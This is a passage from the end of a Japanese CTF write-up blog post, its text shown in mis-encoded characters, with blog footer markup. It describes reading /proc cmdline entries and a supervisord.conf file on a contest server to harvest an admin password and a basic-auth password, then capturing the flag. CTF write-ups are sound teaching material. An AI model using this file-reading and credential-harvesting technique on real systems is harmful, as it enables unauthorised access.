<p><code>/proc/self/cmdline</code> ã‹ã‚‰ :5000 ã®ã‚µãƒ¼ãƒãƒ¼ã®ã‚³ãƒ¼ãƒ‰ã®å ´æ‰€ãŒã‚ã‹ã‚Šã€</p>
<img src="/img/2024/02-25/Untitled%2054.png" width="auto" height="auto">

<p>ãã‚Œã‚’èª­ã‚€ã“ã¨ã§æœ¬ç‰©ã® <code>admin</code> ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒ <code>EyS9$Ww4nhx)</code> ã§ã‚ã‚‹ã“ã¨ãŒè¿½åŠ ã§ã‚ã‹ã£ãŸã‚Šã—ãŸãŒã€ç‰¹ã«æ­£è§£ã«è¿‘ã¥ãã‚‚ã®ã§ã¯ãªã‹ã£ãŸã€‚</p>
<p>ä»–ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚‚è¦‹ã‚‹ã‹ã¨ã„ã†ã“ã¨ã§ã€ <code>/proc/1/cmdline</code> ã‹ã‚‰çœºã‚ã‚‹ã€‚</p>
<img src="/img/2024/02-25/Untitled%2055.png" width="auto" height="auto">

<p>ãŠã€supervisord.confãŒæ°—ã«ãªã‚‹ã€‚</p>
<img src="/img/2024/02-25/Untitled%2056.png" width="auto" height="auto">

<p>ãªã‚“ã‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚ã‚‹ï¼ã“ã‚ŒãŒ :8000 ã®basicèªè¨¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã ã£ãŸã€‚Basicèªè¨¼çªç ´ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªåã«ãªã£ã¦ã„ãŸã€‚</p>
<img src="/img/2024/02-25/Untitled%2057.png" width="auto" height="auto">

<aside>
â›³ FLAG{pLi5lfm8hJK7}

</aside>

    
  </div>
  <footer class="entry-footer">
    <div class="entry-meta-footer">
      <span class="category">
        
      </span>
      <span class="tags">
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/" rel="tag">ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£</a></li></ul>

      </span>
    </div>
  </footer>
  
  <footer class="author-info clearfix">
    <img class="author-picture circle" src="https://www.gravatar.com/avatar/cb02a2b3f429b7c938d1fe2665e8e342">
    <div class="author-content right">
      <div class="author-caption">
        <span class="label">author</span>
        Sho Nakatani a.k.a. laysakura
      </div>
      <p class="author-description">
        æ±äº¬å¤§å­¦å¤§å­¦é™¢ æƒ…å ±ç†å·¥å­¦ç³»ç ”ç©¶ç§‘ é›»å­æƒ…å ±å­¦å°‚æ”» ä¿®å£«èª²ç¨‹ã§ä¸¦åˆ—åˆ†æ•£å‡¦ç†ãƒ»ã‚¹ãƒˆãƒªãƒ¼ãƒ å‡¦ç†ãƒ»ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ç ”ç©¶ã€‚<br>
        2014å¹´4æœˆã«æ ªå¼ä¼šç¤¾ãƒ‡ã‚£ãƒ¼ãƒ»ã‚¨ãƒŒãƒ»ã‚¨ãƒ¼ã«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ã‚¹ãƒšã‚·ãƒ£ãƒªã‚¹ãƒˆã¨ã—ã¦å…¥ç¤¾ã—ã€ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚²ãƒ¼ãƒ ã®ã‚µãƒ¼ãƒã‚µã‚¤ãƒ‰å…±é€šåŸºç›¤ã®é–‹ç™ºã«å¾“äº‹ã€‚<br>
        2016å¹´8æœˆã‚ˆã‚Šã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³è¨¼åˆ¸ä¼šç¤¾<a target="_blank" rel="noopener" href="https://folio-sec.com">æ ªå¼ä¼šç¤¾FOLIO</a>ã«å…¥ç¤¾ã€‚ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‚·ã‚¹ãƒ†ãƒ é–‹ç™ºãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒãƒãƒ¼ã‚¸ãƒ¡ãƒ³ãƒˆãƒ»Engineering
        Managementã«å¾“äº‹ã€‚<br>
        2020å¹´3æœˆã‚ˆã‚Š<a target="_blank" rel="noopener" href="https://idein.jp">Ideinæ ªå¼ä¼šç¤¾</a>æ‰€å±ã€‚ãƒ‡ãƒã‚¤ã‚¹ãƒ»é«˜æ€§èƒ½è¨ˆç®—é–¢é€£ã®ç ”ç©¶é–‹ç™ºã€‚<br>
        2021å¹´9æœˆã‚ˆã‚Šãƒˆãƒ¨ã‚¿è‡ªå‹•è»Šæ ªå¼ä¼šç¤¾æ‰€å±ã€‚è‡ªå‹•è»Šãƒ‡ãƒ¼ã‚¿ã®åé›†ã€œåˆ†æåŸºç›¤ã®ç ”ç©¶é–‹ç™ºã«å¾“äº‹ã€‚<br>
        ãã®ä»–å€‹äººäº‹æ¥­ä¸»ã¨ã—ã¦ã€RDBMSé–‹ç™ºã‚„Intel SGXã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªé–‹ç™ºãªã©ã®æ´»å‹•ã€‚
      </p>
      <ul class="author-social-buttons">
        <li class="author-social-button"><a class="fa fa-lg fa-twitter-square" target="_blank" rel="noopener" href="https://twitter.com/laysakura"></a>
        </li>
        <li class="author-social-button"><a class="fa fa-lg fa-github-square" target="_blank" rel="noopener" href="https://github.com/laysakura"></a>
        </li>
        <li class="author-social-button"><a class="fa fa-lg fa-facebook-square"
            target="_blank" rel="noopener" href="https://www.facebook.com/lay.sakura"></a></li>
      </ul>
    </div>
  </footer>
  
  
  
<nav id="article-nav">
  
  
    <a href="/2024/01/10/flatt-security-developers-quiz-6/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">
        
          Writeup - Flatt Security Developers&#39; Quiz ï¼ƒ6
        
      </div>
    </a>
  
</nav>

  
</article>




<section id="comments">
  <div id="disqus_thread">

    <!-- comment service provided by disqus -->
    <script>
      /**
       *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
       *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
       */
      var disqus_config = function () {
        this.page.url = https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/;  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
      };
      (function () {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');

        s.src = '//laysakura.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      })();
    </script>

    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
        Disqus.</a></noscript>
  </div>
</section>


    </div>
    <div class="mb-search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:laysakura.github.io">
  </form>
</div>
<footer id="footer">
	<h1 class="footer-blog-title">
		<a href="/">ä¿ºã¨ãŠå‰ã¨laysakura</a>
	</h1>
	<span class="copyright">
		&copy; 2024 Sho Nakatani a.k.a. laysakura<br>
		Modify from <a href="https://sanographix.github.io/tumblr/apollo/" target="_blank">Apollo</a> theme, designed by <a href="https://www.sanographix.net/" target="_blank">SANOGRAPHIX.NET</a><br>
		Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
	</span>
</footer>

    
<script>
  var disqus_shortname = 'laysakura';
  
  var disqus_url = 'https://laysakura.github.io/2024/02/26/vlc-cybercontest-2024/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//go.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>



<script src="/js/script.js"></script>

  </div>

  <!-- https://github.com/vfeskov/vanilla-back-to-top -->
  <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
  <script>addBackToTop({
    diameter: 50,
    backgroundColor: '#33a6b880',
    textColor: '#fff'
  })</script>

</body>
</html>
